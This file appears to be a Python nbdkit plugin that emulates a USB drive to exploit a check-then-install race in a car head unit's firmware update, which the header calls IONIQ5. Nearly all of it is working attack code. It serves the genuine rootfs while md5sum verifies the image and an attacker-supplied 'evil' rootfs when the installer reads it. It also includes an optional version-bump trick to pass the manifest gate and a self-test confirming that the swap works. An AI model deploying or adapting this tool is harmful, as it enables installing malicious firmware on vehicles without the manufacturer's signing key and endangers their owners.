#!/usr/bin/env python3
# nbdkit Python plugin: dynamic USB backing for the IONIQ5 update TOCTOU.
# See README. Serves a BENIGN baseline image, but makes byte REGIONS dynamic across the
# host's read passes. `switch_after_pass` is the 1-based PHYSICAL read pass on which the
# served content flips; pass #1 is the very first sequential sweep of the region. Modes:
#   benign_then_evil (rootfs): GENUINE for passes 1..(switch_after_pass-1), EVIL from
#        switch_after_pass onward. VM Path-1 proved the rootfs file is opened EXACTLY TWICE:
#        pass #1 = `ionice -c3 md5sum` (the check; the RSA verify is over md5sum.txt, NOT a
#        re-read of the 879MB rootfs), pass #2 = `DecryptToPIPE | tar` (the install). So the
#        correct value is switch_after_pass=2: md5sum reads genuine (check passes), the
#        installer reads evil. Verified A, installed B. No OEM private key.
#   evil_then_benign (optional xml, only if the version manifest is signed AND you version-bump):
#        version-BUMPED copy for passes 1..(switch_after_pass-1) (version gate accepts), GENUINE
#        copy from switch_after_pass onward (signature validates). For a bump checked then
#        verified in 2 reads, switch_after_pass=2. Unused for a same-version reinstall.
# rootfs (~879MB) > Pi Zero 2 W RAM (512MB) => host cannot cache it => every pass hits here.
# Self-test: python3 nbdkit_toctou.py --selftest
import os, sys, threading, builtins, json, time
API_VERSION = 2
_cfg = {}; _regions = []; _lock = threading.Lock(); _base_fd = None; _size = 0
_reads_fd = None; _reads_last_sync = 0.0
def _mono(): return time.clock_gettime(time.CLOCK_MONOTONIC)
def _ts():
    try: w = time.strftime("%Y-%m-%dT%H:%M:%S")
    except Exception: w = "?"
    return f"{w} mono={_mono():.3f}"
def _log(msg, sync=False):
    line = f"[toctou] {_ts()} {msg}\n"
    try: sys.stderr.write(line)
    except Exception: pass
    p = _cfg.get("log")
    if p:
        try:
            fd = os.open(p, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o644)
            os.write(fd, line.encode())
            if sync:
                try: os.fsync(fd)
                except OSError: pass
            os.close(fd)
        except OSError: pass
def config(key, value):
    if key in ("baseline", "regions", "log", "reads"): _cfg[key] = value
    else: raise RuntimeError(f"unknown config key {key}")
def config_complete():
    for r in ("baseline", "regions"):
        if r not in _cfg: raise RuntimeError(f"missing config: {r}")
    _cfg.setdefault("log", "/var/log/toctou.log")
    _cfg.setdefault("reads", "/var/log/toctou-reads.log")
    with builtins.open(_cfg["regions"]) as fh:
        for r in json.load(fh):
            r.setdefault("switch_after_pass", 2); r.setdefault("mode", "benign_then_evil")
            r["off"] = int(r["off"]); r["len"] = int(r["len"])
            r["_passes"] = 0; r["_max"] = -1; r["_switched"] = False; r["_fd"] = None
            r["_seen"] = False   # whether the first read of this region has been counted yet
            r["_p_reads"] = 0; r["_p_g"] = 0; r["_p_e"] = 0; r["_p_min"] = 0; r["_p_t0"] = 0.0
            r["_near"] = False  # was the previous read inside the region-start zone
            _regions.append(r)
def open(readonly):
    global _base_fd, _size
    _base_fd = os.open(_cfg["baseline"], os.O_RDONLY)
    _size = os.lseek(_base_fd, 0, os.SEEK_END)
    for r in _regions:
        r["_fd"] = os.open(r["evil"], os.O_RDONLY)
        _log(f"region [{r['off']},{r['off']+r['len']}) mode={r['mode']} switch_after_pass={r['switch_after_pass']} evil={r['evil']}")
    try: bootid = builtins.open("/proc/sys/kernel/random/boot_id").read().strip()
    except OSError: bootid = "?"
    sess = os.urandom(4).hex()
    global _reads_fd, _reads_last_sync
    try:
        _reads_fd = os.open(_cfg["reads"], os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o644)
        os.write(_reads_fd, f"# SESSION sess={sess} boot={bootid} pid={os.getpid()} "
                            f"mono0={_mono():.3f} wall={time.strftime('%Y-%m-%dT%H:%M:%S')} "
                            f"region=[{_regions[0]['off']},{_regions[0]['off']+_regions[0]['len']}) "
                            f"switch_after_pass={_regions[0]['switch_after_pass'] if _regions else '?'}\n".encode())
        os.fsync(_reads_fd); _reads_last_sync = _mono()
    except OSError: _reads_fd = None
    _log(f"open baseline={_cfg['baseline']} size={_size} regions={len(_regions)}")
    _log(f"===== SESSION START sess={sess} boot={bootid} pid={os.getpid()} "
         f"switch_after_pass={_regions[0]['switch_after_pass'] if _regions else '?'} =====", sync=True)
    return {"sess": sess}
def get_size(h): return _size
def _pf(fd, count, offset):
    os.lseek(fd, offset, os.SEEK_SET); buf = b""
    while len(buf) < count:
        c = os.read(fd, count - len(buf))
        if not c: buf += b"\x00" * (count - len(buf)); break
        buf += c
    return buf
def _region_for(offset, count):
    for r in _regions:
        if offset < r["off"] + r["len"] and offset + count > r["off"]: return r
    return None
def _rlog(line):
    # high-volume per-read log: buffered append to a persistent fd, fsync at most ~1/sec
    global _reads_fd, _reads_last_sync
    if _reads_fd is None: return
    try:
        os.write(_reads_fd, line.encode())
        now = _mono()
        if now - _reads_last_sync >= 1.0:
            try: os.fsync(_reads_fd)
            except OSError: pass
            _reads_last_sync = now
    except OSError: pass
def _finish_pass(r):
    if r.get("_p_reads", 0) <= 0 or r.get("_passes", 0) < 1:
        r["_p_reads"] = 0; return
    g = r.get("_p_g", 0); e = r.get("_p_e", 0)
    served = "GENUINE" if e == 0 else ("EVIL" if g == 0 else "MIXED")
    dur = _mono() - r.get("_p_t0", _mono())
    _log(f"region@{r['off']} PASS #{r['_passes']} END reads={r['_p_reads']} "
         f"bytes_genuine={g} bytes_evil={e} served={served} "
         f"span=[{r.get('_p_min',0)},{r.get('_max',0)}] dur={dur:.2f}s", sync=True)
    r["_p_reads"] = 0
def _serve(count, offset):
    r = _region_for(offset, count)
    if r is None: return _pf(_base_fd, count, offset)
    with _lock:
        # A sweep starts when a read RETURNS to the region-start zone after the previous reads
        # went at least halfway in (debounced via r["_near"]). Robust to the HU reading the file
        # tail first / caching the last blocks (which defeated an "reached the end" trigger).
        near = offset <= r["off"] + min(0x10000, max(0x1000, r["len"] >> 3))
        deep = r["_max"] >= r["off"] + (r["len"] >> 1)
        new_sweep = near and not r["_near"] and (not r["_seen"] or deep)
        r["_near"] = near
        if new_sweep:
            _finish_pass(r)
            r["_seen"] = True; r["_passes"] += 1; r["_max"] = -1
            r["_p_reads"] = 0; r["_p_g"] = 0; r["_p_e"] = 0
            r["_p_min"] = offset; r["_p_t0"] = _mono()
            _log(f"region@{r['off']} PASS #{r['_passes']} START off={offset} count={count}", sync=True)
            if r["_passes"] >= r["switch_after_pass"] and not r["_switched"]:
                r["_switched"] = True
                _log(f"*** region@{r['off']} SWITCH at pass #{r['_passes']} (mode={r['mode']}) ***", sync=True)
        r["_max"] = max(r["_max"], offset + count); switched = r["_switched"]
        use_evil = switched if r["mode"] == "benign_then_evil" else (not switched)
        r["_p_reads"] = r.get("_p_reads", 0) + 1
        if use_evil: r["_p_e"] = r.get("_p_e", 0) + count
        else: r["_p_g"] = r.get("_p_g", 0) + count
        if offset < r.get("_p_min", offset): r["_p_min"] = offset
        _rlog(f"{_mono():.3f} {'E' if use_evil else 'G'} off={offset} len={count} pass={r['_passes']}\n")
    if use_evil: return _pf(r["_fd"], count, offset - r["off"])
    return _pf(_base_fd, count, offset)
def pread(h, buf, offset, flags=0):
    # nbdkit Python API v2: buf is a writable buffer filled in place (return None).
    # The selftest calls this with an int count and expects bytes back; support both.
    if isinstance(buf, int):
        return _serve(buf, offset)
    buf[:] = _serve(len(buf), offset)
    return None
def close(h):
    global _reads_fd
    for r in _regions:
        _finish_pass(r)
    if _reads_fd is not None:
        try: os.fsync(_reads_fd); os.close(_reads_fd)
        except OSError: pass
        _reads_fd = None
    _log(f"===== SESSION END sess={h.get('sess','?') if isinstance(h, dict) else '?'} =====", sync=True)
    if _base_fd is not None:
        try: os.close(_base_fd)
        except OSError: pass
    for r in _regions:
        if r.get("_fd") is not None:
            try: os.close(r["_fd"])
            except OSError: pass
def _selftest():
    import tempfile, hashlib
    d = tempfile.mkdtemp(); size = 0x20000
    r1 = dict(off=0x4000, len=0x8000); r2 = dict(off=0x10000, len=0x4000)
    base = bytearray([0xAA]) * size
    base[r1["off"]:r1["off"]+r1["len"]] = bytes([0xBB])*r1["len"]
    base[r2["off"]:r2["off"]+r2["len"]] = bytes([0x11])*r2["len"]
    bp = os.path.join(d,"usb.img"); builtins.open(bp,"wb").write(bytes(base))
    ev1 = os.path.join(d,"evil_rootfs"); builtins.open(ev1,"wb").write(bytes([0xEE])*r1["len"])
    ev2 = os.path.join(d,"highver_xml"); builtins.open(ev2,"wb").write(bytes([0x99])*r2["len"])
    regions = [dict(off=r1["off"],len=r1["len"],evil=ev1,switch_after_pass=2,mode="benign_then_evil"),
               dict(off=r2["off"],len=r2["len"],evil=ev2,switch_after_pass=2,mode="evil_then_benign")]
    rp = os.path.join(d,"regions.json"); builtins.open(rp,"w").write(json.dumps(regions))
    config("baseline", bp); config("regions", rp); config("log", os.path.join(d,"t.log"))
    config_complete(); h = open(False)
    def rd(reg):
        out=b""; off=reg["off"]
        while off < reg["off"]+reg["len"]: out+=pread(h,0x1000,off); off+=0x1000
        return out
    R1=[rd(r1) for _ in range(3)]; R2=[rd(r2) for _ in range(3)]
    nt = pread(h, 0x1000, 0x1f000); close(h)
    # 1-based passes, switch_after_pass=2: pass1 genuine, pass2 onward switched.
    rootfs_ok = (R1[0]==bytes([0xBB])*r1["len"] and R1[1]==bytes([0xEE])*r1["len"] and R1[2]==bytes([0xEE])*r1["len"])
    xml_ok    = (R2[0]==bytes([0x99])*r2["len"] and R2[1]==bytes([0x11])*r2["len"] and R2[2]==bytes([0x11])*r2["len"])
    print("ROOTFS  md5sum/install/after :", [hashlib.md5(x).hexdigest()[:6] for x in R1], "=>", "OK" if rootfs_ok else "FAIL", "(want genuine,evil,evil)")
    print("XML     verread/checksign/after:", [hashlib.md5(x).hexdigest()[:6] for x in R2], "=>", "OK" if xml_ok else "FAIL", "(want bumped,genuine,genuine)")
    print("non-region benign:", nt==bytes([0xAA])*0x1000)
    ok = rootfs_ok and xml_ok and nt==bytes([0xAA])*0x1000
    print("SELFTEST", "OK" if ok else "FAIL"); sys.exit(0 if ok else 1)
if __name__ == "__main__" and "--selftest" in sys.argv:
    _selftest()
